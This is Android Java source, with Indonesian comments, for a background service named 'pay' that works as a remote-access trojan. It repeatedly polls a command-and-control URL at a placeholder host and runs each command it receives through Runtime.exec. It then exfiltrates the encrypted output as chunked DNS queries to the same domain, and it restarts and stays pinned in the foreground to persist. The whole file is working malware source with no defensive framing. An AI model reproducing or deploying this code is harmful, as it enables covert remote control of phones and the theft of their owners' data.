import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.concurrent.TimeUnit;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class pay extends Service {

    private static final String TAG = "pay";
    private static final String CHANNEL_ID = "pay_channel";
    private static final int NOTIFICATION_ID = 12345;
    private static final String C2_DNS = "your-c2-server.example.com";
    private static final String COMMAND_URL = "http://" + C2_DNS + "/command";
    private static final byte[] AES_KEY = {
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
            0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
    };

    private boolean isRunning = false;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());

        backgroundThread = new HandlerThread("payThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            isRunning = true;
            backgroundHandler.post(this::commandLoop);
        }
        return START_STICKY; // Jika service mati, akan restart (tapi foreground service biasanya tetap hidup)
    }

    private void commandLoop() {
        while (isRunning) {
            try {
                String command = fetchCommand();
                if (command != null && !command.trim().isEmpty()) {
                    String output = executeCommand(command);
                    sendData("CMD_OUT", encrypt(output.getBytes()));
                }
                Thread.sleep(30000); // 30 detik
            } catch (Exception e) {
                Log.e(TAG, "Loop error", e);
            }
        }
    }

    private String fetchCommand() {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(COMMAND_URL);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
                reader.close();
                return sb.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "fetchCommand error", e);
        } finally {
            if (conn != null) conn.disconnect();
        }
        return null;
    }

    private String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            while ((line = errorReader.readLine()) != null) {
                output.append("[ERR] ").append(line).append("\n");
            }
            process.waitFor(10, TimeUnit.SECONDS);
            reader.close();
            errorReader.close();
        } catch (Exception e) {
            output.append("Execution error: ").append(e.getMessage());
        }
        return output.toString();
    }

    private byte[] encrypt(byte[] data) {
        try {
            SecretKeySpec key = new SecretKeySpec(AES_KEY, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, key);
            return cipher.doFinal(data);
        } catch (Exception e) {
            return data;
        }
    }

    private void sendData(String type, byte[] encryptedData) {
        try {
            String b64 = Base64.encodeToString(encryptedData, Base64.NO_WRAP);
            for (int i = 0; i < b64.length(); i += 60) {
                String chunk = b64.substring(i, Math.min(i + 60, b64.length()));
                String dnsQuery = chunk + "." + System.currentTimeMillis() + "." + type + "." + C2_DNS;
                InetAddress.getByName(dnsQuery);
                Thread.sleep(50);
            }
        } catch (Exception e) {
            Log.e(TAG, "sendData error", e);
        }
    }

    /**
     * Membuat channel notifikasi untuk Android 8+
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Pay Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Channel for background service");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    /**
     * Membuat notifikasi yang akan ditampilkan saat service berjalan di foreground
     */
    private Notification createNotification() {
        // Intent untuk membuka MainActivity saat notifikasi diklik
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Pay Service")
                .setContentText("Remote access service is running...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details) // Ganti dengan ikon aplikasi Anda
                .setContentIntent(pendingIntent)
                .setOngoing(true) // Tidak bisa di-swipe
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
        }
        // Hentikan foreground service
        stopForeground(true);
    }
}
